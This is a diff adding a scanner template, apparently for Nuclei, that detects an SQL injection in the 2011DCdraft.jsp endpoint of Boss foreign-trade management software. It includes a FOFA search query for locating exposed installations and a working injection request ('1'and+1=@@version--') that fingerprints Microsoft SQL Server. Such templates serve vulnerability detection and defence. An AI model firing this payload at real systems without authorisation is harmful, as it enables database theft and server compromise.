@@ -1,0 +1,30 @@
+id: bosssoft-2011DCdraft-sqli
+info:
+  name: 博斯外贸管理软件 2011DCdraft.jsp 存在SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 博斯外贸管理软件 2011DCdraft.jsp接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/azck083mi7gbp79y
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: title="欢迎使用 博斯软件"
+    tips:
+    repair:
+    version:
+  tags: bosssoft,sqli
+
+http:
+  - raw:
+      - |
+        GET /crm/module/2011DCdraft.jsp?c_ex1=1'and+1=@@version-- HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Microsoft SQL Server')
+        condition: and
